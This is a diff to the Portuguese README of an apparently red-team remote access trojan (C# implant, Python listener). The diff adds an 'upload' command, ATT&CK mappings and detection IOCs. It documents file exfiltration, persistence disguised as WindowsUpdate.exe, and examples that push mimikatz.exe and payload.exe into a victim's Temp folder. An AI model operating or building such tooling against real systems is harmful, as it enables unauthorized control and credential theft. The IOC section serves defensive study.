@@ -39,12 +39,14 @@
 - **Navegação de diretórios (`cd`):** Altera o diretório de trabalho do processo e retorna o caminho atual.
 - **Enumeração de sistema (`sysinfo`):** Retorna informações detalhadas do host — nome, usuário, domínio, OS, versão .NET, cores, uptime.
 - **Exfiltração de arquivos (`download`):** Transfere arquivos arbitrários do host para o operador via protocolo customizado (`FILE_START:<nome>:<tamanho>`).
+- **Recebimento de arquivos (`upload`):** Recebe arquivos enviados pelo operador e os grava em disco no diretório de trabalho atual do implant, via protocolo customizado (`FILE_PUSH:<nome>:<tamanho>`).
 
 ### 🖥️ Listener — `listener.py` (Python 3)
 
 - Console interativo com prompt `RAT>` para envio de comandos.
 - Exibe o banner `SYSTEM_INFO` automaticamente ao receber nova conexão.
 - Parser de protocolo `FILE_START` para recebimento de arquivos via `download`.
+- Comando `upload <caminho_local>` para envio de arquivos ao implant via protocolo `FILE_PUSH`.
 - Shutdown limpo via `Ctrl+C`.
 - Compilável como executável standalone via `listener.spec` (PyInstaller).
 
@@ -60,6 +62,7 @@
 | Execution           | Command and Scripting Interpreter: Windows CMD       | T1059.003 |
 | Command & Control   | Application Layer Protocol: Non-Standard Port        | T1571     |
 | Exfiltration        | Exfiltration Over C2 Channel                         | T1041     |
+| Command & Control   | Ingress Tool Transfer                                | T1105     |
 
 ---
 
@@ -69,7 +72,7 @@
 |-----------------|----------------------------------------------------------------|
 | Implant         | C# · .NET 10 · `System.Net.Sockets` · `Microsoft.Win32`       |
 | Listener        | Python 3 · `socket` (stdlib) · PyInstaller                    |
-| Protocolo       | TCP raw · framing customizado (`FILE_START`)                   |
+| Protocolo       | TCP raw · framing customizado (`FILE_START` / `FILE_PUSH`)     |
 | Persistência    | Windows Registry · NTFS File Attributes · Watchdog Thread      |
 | Infraestrutura  | Oracle Cloud Free Tier · Ubuntu 22.04 · IP público fixo        |
 | Acesso remoto   | SSH · Ed25519 · par de chaves por ambiente                     |
@@ -181,6 +184,25 @@ RAT> cmd dir
 RAT> download senhas.txt
 ```
 
+### 4. Enviar arquivos para o implant (`upload`)
+
+O comando `upload` permite transferir um arquivo da máquina do operador para o diretório de trabalho atual do implant. O listener lê o arquivo localmente, envia o cabeçalho `FILE_PUSH:<nome>:<tamanho>` seguido do conteúdo binário, e o implant grava o arquivo em disco.
+
+```
+RAT> upload /home/kali/tools/mimikatz.exe
+# [*] Enviando mimikatz.exe (1.245.184 bytes)...
+# [+] Upload concluído: mimikatz.exe
+```
+
+O arquivo será gravado no diretório de trabalho atual do implant. Use `cd` antes do upload para controlar o destino:
+
+```
+RAT> cd C:\Users\victim\AppData\Local\Temp
+RAT> upload /home/kali/tools/payload.exe
+```
+
+> 💡 O protocolo `FILE_PUSH` espelha o `FILE_START` usado no `download` — mesmo framing, direção invertida.
+
 ---
 
 ## 🔍 IOCs para Blue Team / Detecção
@@ -192,6 +214,7 @@ Para fins de defesa e exercícios de threat hunting, os indicadores deste agente
 - **Processo:** `WindowsUpdate.exe` originado de `%APPDATA%` (não de `C:\Windows\`)
 - **Watchdog:** Processo relançado via `cmd.exe /c start` caso seja encerrado manualmente
 - **Rede:** Conexão TCP de saída persistente em porta não-padrão com reconexão a cada 5s
+- **Filesystem (upload):** Arquivos criados em diretórios de trabalho do implant originados de conexão de rede de entrada — binários em `%TEMP%` ou caminhos de usuário sem origem legítima
 
 ---
 
